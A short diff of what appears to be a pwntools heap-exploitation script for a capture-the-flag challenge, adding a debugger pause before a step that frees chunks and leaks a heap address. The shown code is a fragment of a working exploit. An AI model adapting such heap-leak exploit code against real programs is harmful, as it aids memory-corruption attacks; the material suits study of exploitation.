@@ -72,6 +72,8 @@ def main():
 	create(1, 0x20, "")	
 	delete(1)
 	delete(0)
+        pid=util.proc.pidof(r)[0]
+        raw_input("[DEBUG] %d" % pid)
 	create(0, 0x20, "")
 	leak_heap=u64(edit("")[:-1].ljust(8,"\x00"))
 	log.info("Heap: 0x{:0x}" .format(leak_heap))
